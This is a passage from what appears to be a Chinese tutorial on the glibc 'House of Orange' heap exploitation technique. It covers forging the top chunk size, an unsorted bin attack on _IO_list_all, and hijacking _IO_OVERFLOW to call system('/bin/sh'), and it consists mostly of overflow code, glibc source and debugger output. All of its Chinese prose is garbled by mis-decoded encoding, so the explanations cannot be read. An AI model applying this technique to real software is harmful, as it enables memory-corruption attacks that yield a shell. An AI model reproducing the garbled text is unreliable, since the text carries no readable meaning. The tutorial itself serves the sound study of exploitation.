*/</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure><p>å³æ»¡è¶³ old_size å°äº <code>nb+MINSIZE</code>ï¼Œ<code>PREV_INUSE</code> æ ‡å¿—ä½ä¸º 1ï¼Œ<code>old_top+old_size</code> é¡µå¯¹é½è¿™å‡ ä¸ªæ¡ä»¶ã€‚</p><p>æˆ‘ä»¬æ€»ç»“ä¸€ä¸‹ä¼ªé€ çš„top chunk sizeçš„è¦æ±‚</p><p>1.ä¼ªé€ çš„sizeå¿…é¡»è¦å¯¹é½åˆ°å†…å­˜é¡µ</p><p>2.sizeè¦å¤§äºMINSIZE(0x10)</p><p>3.sizeè¦å°äºä¹‹åç”³è¯·çš„chunk size + MINSIZE(0x10)</p><p>4.sizeçš„prev inuseä½å¿…é¡»ä¸º1</p><p>ä¹‹ååŸæœ‰çš„top chunkå°±ä¼šæ‰§è¡Œ<code>_int_free</code>ä»è€Œé¡ºåˆ©è¿›å…¥unsorted binä¸­ã€‚</p><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­:</p><p>æˆ‘ä»¬é¦–å…ˆ malloc ä¸€ä¸ª 0x400 çš„chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; heap</span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1025,  // hex(1025) == 0x401</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šå¸¸æƒ…å†µä¸‹ ï¼Œtop chunk å¤§å°ä¸º 0x21000ï¼Œå‡å» 0x400ï¼Œæ‰€ä»¥æ­¤æ—¶çš„å¤§å°ä¸º 0x20c00ï¼Œå¦å¤– PREV_INUSE è¢«è®¾ç½®ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; top_chunk</span><br><span class="line">0x602400 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 134145,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">PwnLife&gt; x/20gx 0x602400</span><br><span class="line">0x602400:0x00000000000000000x0000000000020c01  &lt;--- top chunk // size</span><br><span class="line">0x602410:0x00000000000000000x0000000000000000</span><br><span class="line">0x602420:0x00000000000000000x0000000000000000</span><br><span class="line">0x602430:0x00000000000000000x0000000000000000</span><br><span class="line">0x602440:0x00000000000000000x0000000000000000</span><br><span class="line">0x602450:0x00000000000000000x0000000000000000</span><br><span class="line">0x602460:0x00000000000000000x0000000000000000</span><br><span class="line">0x602470:0x00000000000000000x0000000000000000</span><br><span class="line">0x602480:0x00000000000000000x0000000000000000</span><br><span class="line">0x602490:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬å‡è®¾æœ‰æº¢å‡ºæ¼æ´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">72</span>     top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line"><span class="number">73</span>     top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br></pre></td></tr></table></figure><p> å°†top chunk çš„size æ”¹ä¸º 0xc01 ï¼Œè¿™æ ·å°±èƒ½æ»¡è¶³ä¸Šé¢æ€»ç»“çš„æ¡ä»¶ã€‚</p><p>ä¹‹åï¼Œæˆ‘ä»¬ç”³è¯·çš„ 0x1000 size çš„ chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure><p>0x1000 &gt; 0xc01 , åˆç”±äº top chunk  çš„ä¼ªé€ æ»¡è¶³æ¡ä»¶ï¼Œç´§æ¥ç€åŸæœ‰çš„ top chunk ä¼šè¢«æ”¾åˆ° unsorted binsé‡Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) â€”â–¸ 0x602400 â—‚â€” 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹ä¸‹æ­¤æ—¶ heap çš„æƒ…å†µ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/4gx p1-0x10+0x400</span><br><span class="line">0x602400:0x00000000000000000x0000000000000be1     &lt;--- old top chunk</span><br><span class="line">0x602410:0x00007ffff7dd1b580x00007ffff7dd1b58</span><br><span class="line">PwnLife&gt; x/4gx p1-0x10+0x400+0xbe0</span><br><span class="line">0x602fe0:0x0000000000000be00x0000000000000010     &lt;----  fencepost chunk 1</span><br><span class="line">0x602ff0:0x00000000000000000x0000000000000011     &lt;----  fencepost chunk 2</span><br><span class="line">PwnLife&gt; x/4gx p2-0x10</span><br><span class="line">0x623000:0x00000000000000000x0000000000001011     &lt;----  chunk p2 </span><br><span class="line">0x623010:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; x/4gx p2-0x10+0x1010</span><br><span class="line">0x624010:0x00000000000000000x0000000000020ff1     &lt;---- new top chunk</span><br><span class="line">0x624020:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) â€”â–¸ 0x602400 â—‚â€” 0x7ffff7dd1b58</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>å¦å¤–å¯ä»¥çœ‹åˆ° old top chunk è¢«ç¼©å°äº† 0x20ï¼Œç¼©å°çš„ç©ºé—´è¢«ç”¨äºæ”¾ç½® fencepost chunkã€‚</p><p>æ ¹æ®æ”¾å…¥ unsorted bin ä¸­ old top chunk çš„ fd/bk æŒ‡é’ˆï¼Œå¯ä»¥æ¨ç®—å‡º <code>_IO_list_all</code> çš„åœ°å€ã€‚ç„¶åé€šè¿‡æº¢å‡ºå°† old top çš„ bk æ”¹å†™ä¸º <code>_IO_list_all-0x10</code>ï¼Œè¿™æ ·åœ¨è¿›è¡Œ unsorted bin attack æ—¶ï¼Œå°±ä¼šå°† <code>_IO_list_all</code> ä¿®æ”¹ä¸º <code>&amp;unsorted_bin-0x10</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602400</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>,</span><br><span class="line">  size = <span class="number">3041</span>,</span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b58</span> &lt;main_arena+<span class="number">88</span>&gt;,</span><br><span class="line">  bk = <span class="number">0x7ffff7dd24f0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/<span class="number">20</span>gx <span class="number">0x7ffff7dd24f0</span></span><br><span class="line"><span class="number">0x7ffff7dd24f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2500</span> &lt;_IO_list_all&gt;:<span class="number">0x00007ffff7dd2520</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2510</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2520</span> &lt;_IO_2_1_stderr_&gt;:<span class="number">0x00000000fbad2887</span><span class="number">0x00007ffff7dd25a3</span></span><br><span class="line"><span class="number">0x7ffff7dd2530</span> &lt;_IO_2_1_stderr_+<span class="number">16</span>&gt;:<span class="number">0x00007ffff7dd25a3</span><span class="number">0x00007ffff7dd25a3</span></span><br><span class="line"><span class="number">0x7ffff7dd2540</span> &lt;_IO_2_1_stderr_+<span class="number">32</span>&gt;:<span class="number">0x00007ffff7dd25a3</span><span class="number">0x00007ffff7dd25a3</span></span><br><span class="line"><span class="number">0x7ffff7dd2550</span> &lt;_IO_2_1_stderr_+<span class="number">48</span>&gt;:<span class="number">0x00007ffff7dd25a3</span><span class="number">0x00007ffff7dd25a3</span></span><br><span class="line"><span class="number">0x7ffff7dd2560</span> &lt;_IO_2_1_stderr_+<span class="number">64</span>&gt;:<span class="number">0x00007ffff7dd25a4</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2570</span> &lt;_IO_2_1_stderr_+<span class="number">80</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2580</span> &lt;_IO_2_1_stderr_+<span class="number">96</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7dd2600</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œä¼šé¡ºä¾¿æ¶‰åŠåˆ°  glibc çš„å¼‚å¸¸å¤„ç†.</p><p>ä¸€èˆ¬åœ¨å‡ºç°å†…å­˜é”™è¯¯æ—¶ï¼Œä¼šè°ƒç”¨å‡½æ•° <code>malloc_printerr()</code> æ‰“å°å‡ºé”™ä¿¡æ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">malloc_printerr (<span class="keyword">int</span> action, <span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">void</span> *ptr, mstate ar_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">if</span> ((action &amp; <span class="number">5</span>) == <span class="number">5</span>)</span><br><span class="line">    __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">2</span> * <span class="keyword">sizeof</span> (<span class="keyword">uintptr_t</span>) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">char</span> *cp = _itoa_word ((<span class="keyword">uintptr_t</span>) ptr, &amp;buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>], <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (cp &gt; buf)</span><br><span class="line">        *--cp = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“è°ƒç”¨  <code>__libc_message</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sysdeps/posix/libc_fatal.c</span></span><br><span class="line"><span class="comment">/* Abort with an error message.  */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_message (<span class="keyword">int</span> do_abort, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">if</span> (do_abort)</span><br><span class="line">    &#123;</span><br><span class="line">      BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Kill the application.  */</span></span><br><span class="line">      <span class="built_in">abort</span> ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>do_abort</code> è°ƒç”¨ <code>fflush</code>ï¼Œå³ <code>_IO_flush_all_lockp</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdlib/abort.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fflush(s) _IO_flush_all_lockp (0)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ++stage;</span><br><span class="line">      fflush (<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/genops.c</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;   <span class="comment">// å°†å…¶è¦†ç›–</span></span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)     <span class="comment">// å°†å…¶ä¿®æ”¹ä¸º system å‡½æ•°</span></span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">      fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      last_stamp = _IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    fp = fp-&gt;_chain;    <span class="comment">// æŒ‡å‘æˆ‘ä»¬æŒ‡å®šçš„åŒºåŸŸ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_list_all</code> æ˜¯ä¸€ä¸ª <code>_IO_FILE_plus</code> ç±»å‹çš„å¯¹è±¡ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯å°† <code>_IO_list_all</code> æŒ‡é’ˆæ”¹å†™ä¸ºä¸€ä¸ªä¼ªé€ çš„æŒ‡é’ˆï¼Œå®ƒçš„ <code>_IO_OVERFLOW</code> æŒ‡å‘ systemï¼Œå¹¶ä¸”å‰ 8 å­—èŠ‚è¢«è®¾ç½®ä¸º â€˜/bin/shâ€™ï¼Œæ‰€ä»¥å¯¹ <code>_IO_OVERFLOW(fp, EOF)</code> çš„è°ƒç”¨æœ€ç»ˆä¼šå˜æˆå¯¹ <code>system(&#39;/bin/sh&#39;)</code> çš„è°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// libio/libio.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ä¸€ä¸ªæŒ‡å‘å‡½æ•°è·³è½¬è¡¨çš„æŒ‡é’ˆï¼Œ<code>_IO_jump_t</code> çš„ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span 